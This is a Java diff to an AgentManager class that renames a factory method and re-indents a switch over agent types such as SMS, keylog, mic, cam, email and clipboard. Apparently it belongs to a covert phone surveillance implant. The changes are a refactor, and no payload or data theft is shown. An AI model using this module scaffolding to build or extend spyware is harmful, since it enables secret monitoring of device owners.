@@ -47,14 +47,14 @@ public class AgentManager extends Manager<AgentBase> {
 	}
 
 	/**
-	 * mapAgent() Add agent id defined by "key" into the running map. If the
+	 * factory() Add agent id defined by "key" into the running map. If the
 	 * agent is already present, the old object is returned.
 	 * 
 	 * @param key
 	 *            : Agent ID
 	 * @return the requested agent or null in case of error
 	 */
-	private AgentBase mapAgent(final int key) {
+	private AgentBase factory(final int key) {
 		AgentBase a = null;
 
 		if (running.containsKey(key) == true) {
@@ -62,61 +62,61 @@ public class AgentManager extends Manager<AgentBase> {
 		}
 
 		switch (key) {
-		case AgentConf.AGENT_SMS:
-			break;
-
-		case AgentConf.AGENT_TASK:
-			break;
-
-		case AgentConf.AGENT_CALLLIST:
-			break;
-
-		case AgentConf.AGENT_DEVICE:
-			a = new DeviceAgent();
-			break;
-
-		case AgentConf.AGENT_POSITION:
-			break;
-
-		case AgentConf.AGENT_CALL:
-			break;
-
-		case AgentConf.AGENT_CALL_LOCAL:
-			break;
-
-		case AgentConf.AGENT_KEYLOG:
-			break;
-
-		case AgentConf.AGENT_SNAPSHOT:
-			a = new SnapshotAgent();
-			break;
-
-		case AgentConf.AGENT_URL:
-			break;
-
-		case AgentConf.AGENT_IM:
-			break;
-
-		case AgentConf.AGENT_EMAIL:
-			break;
-
-		case AgentConf.AGENT_MIC:
-			break;
-
-		case AgentConf.AGENT_CAM:
-			break;
-
-		case AgentConf.AGENT_CLIPBOARD:
-			break;
-
-		case AgentConf.AGENT_CRISIS:
-			break;
-
-		case AgentConf.AGENT_APPLICATION:
-			break;
-
-		default:
-			break;
+			case AgentConf.AGENT_SMS:
+				break;
+	
+			case AgentConf.AGENT_TASK:
+				break;
+	
+			case AgentConf.AGENT_CALLLIST:
+				break;
+	
+			case AgentConf.AGENT_DEVICE:
+				a = new DeviceAgent();
+				break;
+	
+			case AgentConf.AGENT_POSITION:
+				break;
+	
+			case AgentConf.AGENT_CALL:
+				break;
+	
+			case AgentConf.AGENT_CALL_LOCAL:
+				break;
+	
+			case AgentConf.AGENT_KEYLOG:
+				break;
+	
+			case AgentConf.AGENT_SNAPSHOT:
+				a = new SnapshotAgent();
+				break;
+	
+			case AgentConf.AGENT_URL:
+				break;
+	
+			case AgentConf.AGENT_IM:
+				break;
+	
+			case AgentConf.AGENT_EMAIL:
+				break;
+	
+			case AgentConf.AGENT_MIC:
+				break;
+	
+			case AgentConf.AGENT_CAM:
+				break;
+	
+			case AgentConf.AGENT_CLIPBOARD:
+				break;
+	
+			case AgentConf.AGENT_CRISIS:
+				break;
+	
+			case AgentConf.AGENT_APPLICATION:
+				break;
+	
+			default:
+				break;
 		}
 
 		if (a != null) {
@@ -149,7 +149,7 @@ public class AgentManager extends Manager<AgentBase> {
 
 		while (it.hasNext()) {
 			final Integer key = it.next();
-			 start(key);
+			start(key);
 		}
 
 		return true;
@@ -191,7 +191,7 @@ public class AgentManager extends Manager<AgentBase> {
 			return;
 		}
 
-		AgentBase a = mapAgent(key);
+		AgentBase a = factory(key);
 
 		if (a == null) {
 			return;
@@ -207,7 +207,7 @@ public class AgentManager extends Manager<AgentBase> {
 		// so unmap and restart the thread
 		if (a.getStatus() == AgentConf.AGENT_STOPPED) {
 			// running.remove(key);
-			a = mapAgent(key);
+			a = factory(key);
 		}
 
 		Check.asserts(a != null, "null agent");
@@ -218,7 +218,6 @@ public class AgentManager extends Manager<AgentBase> {
 		final Thread t = new Thread(a);
 		threads.put(a, t);
 		t.start();
-
 	}
 
 	/**
@@ -229,6 +228,7 @@ public class AgentManager extends Manager<AgentBase> {
 	 */
 	public synchronized void stop(final int key) {
 		final AgentBase a = running.get(key);
+		
 		if (a == null) {
 			Log.d("RCS", "Agent " + key + " not present");
 			return;
@@ -237,6 +237,7 @@ public class AgentManager extends Manager<AgentBase> {
 		a.stopThread();
 
 		final Thread t = threads.get(a);
+		
 		if (t != null) {
 			try {
 				t.join();
@@ -245,6 +246,7 @@ public class AgentManager extends Manager<AgentBase> {
 				e.printStackTrace();
 			}
 		}
+		
 		threads.remove(a);
 	}
 
